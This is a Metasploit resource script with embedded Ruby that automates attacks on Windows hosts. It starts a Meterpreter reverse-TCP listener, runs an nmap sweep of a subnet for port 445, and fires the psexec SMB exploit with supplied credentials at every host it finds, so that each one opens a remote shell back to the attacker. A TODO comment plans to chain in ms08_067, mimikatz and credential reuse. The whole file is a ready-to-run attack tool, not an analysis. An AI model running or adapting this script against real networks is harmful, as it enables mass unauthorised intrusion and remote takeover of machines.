#################################################
# Created by @jgaudard  :: I don't twitter much 
# Resource file for metasploit
# Auto exploits by setting up a multi-handler, then running
# an NMAP scan for port 445, and finally uses psexec against
# any targets with port 445 open.
# Created: 30 April 2016    Edited: 30 April 2016
# Version 0.9
#################################################
# TODO
# ms08_067 > mimikatz > db creds > psexec
#
#
#################################################
 
<ruby>
 
### Setting up variables ###
lhost = "192.168.1.33"
lport = "7777"
handler = "exploit/multi/handler"
payload = "windows/meterpreter/reverse_tcp"

### accepts targets formated for nmap CIDR, Comma, or Dash. ###
targets = "192.168.1.0/24" 

### psexec options ###
exploit = "exploit/windows/smb/psexec"
share = "ADMIN$"
pass = "password"
user = "user"
port = "445"
 
 
### Setting Global Options ###
run_single("setg LHOST #{lhost}")
 
### Starting Mulit-Handler ###

run_single("use #{handler}")
run_single("set PAYLOAD #{payload}")
run_single("set LPORT #{lport}")
run_single("set ExitOnSession false")
run_single("exploit -j")
 
### Setup Workspace ###
run_single("workspace -d autopwn")
run_single("workspace -a autopwn")
run_single("workspace autopwn")  #probably redundant
 
### Runs NMAP ###
run_single("db_nmap -T5 --exclude #{lhost} -p #{port} #{targets}")

### Give me your tired, your poor, your shells! ###
framework.db.hosts.each do |host|
        host.services.each do |service|
                if service.name == "microsoft-ds" and service.state == "open"
                        print_line("exploiting #{host.address}")
                        run_single("use #{exploit}")
                        run_single("set SHARE #{share}")
                        run_single("set SMBPass #{pass}")
                        run_single("set SMBUser #{user}")
			run_single("set RHOST #{host.address}")
                        run_single("set PAYLOAD #{payload}")
                        run_single("set LPORT #{lport}")
                        run_single("set DisablePayloadHandler true")
                        run_single("exploit -z")
                        run_single("back")
                end
        end
end
 
</ruby>
